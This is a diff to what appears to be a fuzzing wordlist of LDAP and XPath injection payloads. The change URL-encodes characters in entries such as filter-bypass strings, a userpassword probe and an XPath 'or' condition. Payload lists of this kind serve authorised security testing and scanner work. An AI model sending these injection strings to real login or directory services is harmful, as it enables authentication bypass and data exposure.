@@ -7,17 +7,17 @@
 %2A%28%7C%28objectclass%3D%2A%29%29
 %2A%7C
 %7C
-&
+%26
 (
 )
-)(cn=))\x00
+)(cn%3D))\x00
 *
 *()|%26'
-*()|&'
-*(|(mail=*))
-*(|(objectclass=*))
-*)(&
-*)(uid=*))(|(uid=*
+*()|%26'
+*(|(mail%3D*))
+*(|(objectclass%3D*))
+*)(%26
+*)(uid%3D*))(|(uid%3D*
 *))%00
 */*
 *|
@@ -27,6 +27,6 @@
 @*
 |
 admin*
-admin*)((|userpassword=*)
-x' or name()='username' or 'x'='y
-x' or name()='username' or 'x'='ys
+admin*)((|userpassword%3D*)
+x'%20or%20name()%3D'username'%20or%20'x'%3D'y
+x'%20or%20name()%3D'username'%20or%20'x'%3D'ys
